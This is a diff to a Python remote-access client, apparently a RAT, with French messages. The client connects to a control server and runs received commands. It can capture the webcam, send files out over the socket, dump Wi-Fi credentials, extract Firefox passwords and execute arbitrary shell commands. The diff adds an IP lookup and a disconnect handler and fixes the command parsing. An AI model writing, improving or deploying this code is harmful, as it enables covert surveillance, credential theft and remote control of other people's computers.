@@ -260,6 +260,11 @@ def exec_cmd(cmd):
 
 
 # ========== HANDLE ==========
+def get_ip():
+    try:
+        return subprocess.check_output("hostname -I", shell=True).decode().strip()
+    except Exception as e:
+        return f"Erreur IP : {e}"
  
 def handle_command(cmd):
     if cmd == "get_ip":
@@ -273,17 +278,19 @@ def handle_command(cmd):
     elif cmd == "webcam":
         return capture_webcam()
     elif cmd.startswith("download "):
-        files = cmd.split(" ",1)[1].split(";")
+        files = cmd.split(" ", 1)[1].split(";")
         send_files(files, client_socket)
+        return "[✓] Fichiers envoyés"
     elif cmd == "wifi":
         return dump_wifi_credentials()
     elif cmd == "firefox_profiles":
         return list_firefox_profiles()
     elif cmd.startswith("firefox_password "):
-        profile_number = cmd.split(" ",1)[1]
+        profile_number = cmd.split(" ", 1)[1]
         return get_firefox_passwords(profile_number)
     else:
         return exec_cmd(cmd)
+
 
 
 
@@ -302,23 +309,27 @@ print(f"Connecté au serveur {HOST}:{PORT}")
 # Échange des messages
 try:
     while True:
-        command = client_socket.recv(4096).decode()
-        if command.strip().lower == "exit":
-            client_socket.close()
-            print("Connexion fermée.")
+        command = client_socket.recv(4096).decode().strip().lower()
+        if command == "exit":
+            print("[~] Fermeture demandée.")
             break
+        elif command == "disconnect":
+            print("[~] Déconnexion demandée par le serveur.")
+            try:
+                client_socket.send("[~] Client va se déconnecter.".encode())
+                client_socket.shutdown(socket.SHUT_RDWR)
+            except Exception as e:
+                print(f"Erreur fermeture socket : {e}")
+            finally:
+                client_socket.close()
+                break  
+
+
         response = handle_command(command)
-        if response is None or response.strip() == "":
+        if response is None or str(response).strip() == "":
             response = "[✓]"
         client_socket.send(response.encode())
 except Exception as e:
     print(f"Erreur côté client : {e}")
-finally: 
+finally:
     client_socket.close()
-
-
-
-
-
-
-
